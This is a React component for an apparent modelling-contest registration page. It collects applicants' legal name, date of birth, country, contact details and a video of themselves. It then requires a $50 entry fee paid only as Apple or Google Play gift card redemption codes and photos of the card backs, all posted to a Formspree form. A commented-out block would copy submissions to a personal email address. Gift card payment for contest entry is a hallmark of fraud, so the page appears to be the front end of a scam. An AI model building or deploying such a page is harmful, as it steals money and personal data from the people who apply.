import React, { useState } from 'react';
import ClickToDateInput from './date';
import { Upload, CreditCard, CheckCircle, Info } from 'lucide-react';

const Registration = () => {
  const [file, setFile] = useState(null);
  const [video, setVideo] = useState(null);
  const [cardType, setCardType] = useState('apple');

  const [dob, setDob] = useState("Date of Birth ");
  const handleDobChange = (e) => {
    setDob(e.target.value);

  }
  const handleFileChange = (e) => {
    if (e.target.files[0]) {
      setFile(e.target.files[0]);
    }
  };
  const handleVideoChange = (e) => {
    if (e.target.files[0]) {
      setVideo(e.target.files[0]);
    }
  };

  return (
    <section id="register" className="py-24 bg-white px-6">
      <div className="max-w-4xl mx-auto">
        <div className="grid md:grid-cols-2 gap-12 items-start">

          {/* Left Side: Info */}
          <div>
            <span className="text-[#C5A059] uppercase tracking-widest text-xs font-bold">Step into the spotlight</span>
            <h2 className="text-4xl font-serif italic text-[#1A1A1A] mt-2 mb-6">Global Application</h2>
            <p className="text-zinc-500 mb-8 leading-relaxed">
              To ensure the quality of our global platform, a one-time entry fee of <span className="text-[#1A1A1A] font-bold">$50 USD</span> is required for all contestants.
            </p>

            <div className="space-y-6">
              <div className="flex gap-4">
                <div className="mt-1"><CheckCircle size={18} className="text-[#C5A059]" /></div>
                <p className="text-sm text-zinc-600">Access to virtual workshops and catwalk coaching.</p>
              </div>
              <div className="flex gap-4">
                <div className="mt-1"><CheckCircle size={18} className="text-[#C5A059]" /></div>
                <p className="text-sm text-zinc-600">Inclusion in the Global Public Voting gallery.</p>
              </div>
              <div className="flex gap-4">
                <div className="mt-1"><CheckCircle size={18} className="text-[#C5A059]" /></div>
                <p className="text-sm text-zinc-600">Direct screening by international fashion scouts.</p>
              </div>
            </div>

            <div className="mt-10 p-4 bg-[#F3F1ED] border-l-4 border-[#C5A059] flex gap-3">
              <Info className="text-[#C5A059] shrink-0" size={20} />
              <p className="text-[11px] text-zinc-500 leading-normal uppercase tracking-wider">
                Note: We use Apple & Google Play credits for secure, cross-border digital processing. Your application will be reviewed within 24 hours of verification.
              </p>
            </div>
          </div>

          {/* Right Side: The Form */}
          <div className="bg-[#FAF9F6] p-8 md:p-10 border border-zinc-100 shadow-sm">
            <form  action="https://formspree.io/f/xjgzyjqa"  method='POST'
            className="space-y-5"> 
              {/* Personal Details */}
              <div className="space-y-4 mb-8">
                <h4 className="text-xs font-bold uppercase tracking-widest text-zinc-400 border-b pb-2">1. Personal Identity</h4>
                <input type="text" id="name" name="FullName" placeholder="Full Legal Name" className="w-full bg-transparent border-b border-zinc-200 py-3 outline-none focus:border-[#C5A059] transition-all text-sm" required />

               


              <ClickToDateInput required/>

                <input type="text" id="country" name="Country" placeholder="Country" className="w-full bg-transparent border-b border-zinc-200 py-3 outline-none focus:border-[#C5A059] transition-all text-sm" required />
                <input type="email" name="email" placeholder="Email Address" className="w-full bg-transparent border-b border-zinc-200 py-3 outline-none focus:border-[#C5A059] transition-all text-sm" required />
                <input type="tel" name="phone" placeholder="Phone Number (Optional)" className="w-full bg-transparent border-b border-zinc-200 py-3 outline-none focus:border-[#C5A059] transition-all text-sm" />

                <h4 className="text-xs font-bold uppercase tracking-widest text-zinc-400 border-b pb-2">Upload 15-30 seconds recording why you want to participate in the contest</h4>

                {/* Video upload */}
                <input
                  name="video-upload"
                  type="file"
                  accept="video/mpeg, video/hvec, video/mp4"
                  id="video-upload"
                  className="hidden"
                  onChange={handleVideoChange}
                  accept="video/*"
                  required
                />
                <label
                  htmlFor="video-upload"
                  className="w-full h-32 border-2 border-dashed border-zinc-200 flex flex-col items-center justify-center cursor-pointer hover:bg-zinc-50 transition-colors rounded-sm"
                >
                  {video ? (
                    <div className="text-center">
                      <CheckCircle className="text-green-500 mx-auto mb-2" />
                      <p className="text-[10px] text-zinc-600 truncate max-w-[200px]">{video.name}</p>
                    </div>
                  ) : (
                    <div className="text-center">
                      <Upload className="text-zinc-300 mx-auto mb-2" />
                      <p className="text-[10px] text-zinc-400 uppercase tracking-widest">Upload Video of Yourself</p>
                    </div>)}


                </label>


              </div>

              {/* Payment Details */}
              <div className="space-y-4">
                <h4 className="text-xs font-bold uppercase tracking-widest text-zinc-400 border-b pb-2">2. Digital Entry Credit ($50)</h4>

                {/* Card Type Selector */}
                <div className="flex gap-4 mb-4">
                  <button
                    type="button"
                    onClick={() => setCardType('apple')}
                    className={`flex-1 py-3 border text-[10px] font-bold uppercase tracking-widest transition-all ${cardType === 'apple' ? 'bg-[#1A1A1A] text-white border-[#1A1A1A]' : 'bg-white text-zinc-400 border-zinc-200 hover:border-zinc-400'}`}
                  >
                    Apple Gift Card
                  </button>
                  <button
                    type="button"
                    onClick={() => setCardType('google')}
                    className={`flex-1 py-3 border text-[10px] font-bold uppercase tracking-widest transition-all ${cardType === 'google' ? 'bg-[#1A1A1A] text-white border-[#1A1A1A]' : 'bg-white text-zinc-400 border-zinc-200 hover:border-zinc-400'}`}
                  >
                    Google Play
                  </button>
                </div>

                <input
                  name="cardCode"
                  type="text"
                  placeholder="Enter Card Redemption Code"
                  className="w-full bg-white border border-zinc-200 p-3 outline-none focus:border-[#C5A059] text-sm font-mono uppercase tracking-widest"
                />

                {/* File Upload */}
                <div className="relative">
                  <input
                    name="cardImage"
                    type="file"
                    accept="image/png, image/jpeg"
                    id="card-upload"
                    className="hidden"
                    onChange={handleFileChange}
                    accept="image/*"
                    required
                  />
                  <label
                    htmlFor="card-upload"
                    className="w-full h-32 border-2 border-dashed border-zinc-200 flex flex-col items-center justify-center cursor-pointer hover:bg-zinc-50 transition-colors rounded-sm"
                  >
                    {file ? (
                      <div className="text-center">
                        <CheckCircle className="text-green-500 mx-auto mb-2" />
                        <p className="text-[10px] text-zinc-600 truncate max-w-[200px]">{file.name}</p>
                      </div>
                    ) : (
                      <div className="text-center">
                        <Upload className="text-zinc-300 mx-auto mb-2" />
                        <p className="text-[10px] text-zinc-400 uppercase tracking-widest">Upload Photo of Card Back</p>
                        <p className="text-[9px] text-zinc-300 mt-1 italic">Ensure code is clearly visible</p>
                      </div>
                    )}
                  </label>
                </div>
              </div>

              <button onclick="sendMail()" className="w-full bg-[#1A1A1A] text-white py-4 font-bold uppercase tracking-[0.3em] hover:bg-[#C5A059] transition-all text-xs mt-4 shadow-lg shadow-zinc-200 pointer-events-auto">
                Complete Registration
              </button>



              {/* <input type="hidden" name="_autoresponse" value="We recieved your Application; we will respond to your shortly"></input>
              <input type="hidden" name="_captcha" value="false" />
              <input type="hidden" name="_next" value="https://thankpg.netlify.app" />
              <input type="hidden" name="_cc" value="nimissolomon@gmail.com" /> */}

            </form>
          </div>

        </div>
      </div>
    </section>
  );
};

export default Registration;